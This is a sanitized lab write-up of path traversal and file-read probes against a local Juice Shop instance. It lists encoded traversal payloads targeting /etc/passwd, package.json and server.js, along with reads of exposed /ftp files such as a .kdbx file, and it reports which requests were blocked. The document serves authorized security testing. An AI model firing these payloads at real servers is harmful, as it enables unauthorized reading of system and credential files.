> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# valuable_candidate_kev_path_traversal_file_read_variants

Status: valuable-candidate / partial verified impact / Kali-side intel-driven lab workflow
Date: 2026-05-22
Route/tool: Windows Hermes control plane -> SSH/SCP -> `<attacker-vm>` -> authorized Juice Shop victim
Artifact root: `<artifact-output-dir>/kali_intel_wave3_20260522T005554Z/`
Sources mapped: CISA KEV, NVD, Exploit-DB path traversal/file-read patterns; OWASP A01/A05; CWE-22/CWE-200 style pattern inspiration

## Why keep this bundle

This bundle is valuable even though traversal to arbitrary OS files did not succeed. It records a reusable modern workflow for distinguishing:

- real exposed-file reads;
- blocked traversal encodings;
- SPA/root fallback false positives;
- 403 controls that can look interesting because error pages contain vulnerability-training text.

## Preconditions

- Authorized local victim: `http://<lab-ip>:3000`
- Kali attacker route verified.
- No public target or third-party system.

## Commands / request shape

The Wave 3 runner executed bounded fixed-path GETs from Kali:

```text
/ftp/
/ftp/legal.md
/ftp/acquisitions.md
/ftp/incident-support.kdbx
/ftp/package.json.bak
/ftp/coupons_2013.md.bak
/ftp/%2e%2e/package.json
/ftp/..%2fpackage.json
/ftp/%252e%252e%252fpackage.json
/ftp/..%2f..%2fetc%2fpasswd
/ftp/%2e%2e%2f%2e%2e%2fetc%2fpasswd
/ftp/....//....//etc/passwd
/ftp/%2e%2e%2fserver.js
```

## Evidence summary

Verified exposed-file reads:

```text
/ftp/ -> HTTP 200 directory listing, root_fallback=no
/ftp/legal.md -> HTTP 200, 3047 bytes, text/markdown
/ftp/acquisitions.md -> HTTP 200, 909 bytes, text/markdown
/ftp/incident-support.kdbx -> HTTP 200, 3246 bytes, application/octet-stream
```

Blocked traversal / sensitive extension controls:

```text
/ftp/package.json.bak -> HTTP 403
/ftp/coupons_2013.md.bak -> HTTP 403
/ftp/..%2fpackage.json -> HTTP 403
/ftp/%252e%252e%252fpackage.json -> HTTP 403
/ftp/..%2f..%2fetc%2fpasswd -> HTTP 403
/ftp/%2e%2e%2f%2e%2e%2fetc%2fpasswd -> HTTP 403
/ftp/....//....//etc/passwd -> HTTP 403
/ftp/%2e%2e%2fserver.js -> HTTP 403
```

False-positive control:

```text
/ftp/%2e%2e/package.json -> HTTP 200 but root_fallback=yes, so not counted as traversal file read.
```

## Impact level

- Level 2: unauthenticated exposed file read for selected `/ftp` files.
- Not Level 4/5: no arbitrary file read, no traversal outside the intended exposed area, no code execution.

## Cleanup / recovery

No write or destructive action in this bundle. Wave 3 post-health remained HTTP 200.

## Next steps

- If a new local target with real traversal behavior is added, reuse this fixed-path + root-fallback suppression workflow.
- For Juice Shop, keep this as `/ftp` exposed-file workflow plus traversal controls, not as arbitrary path traversal.
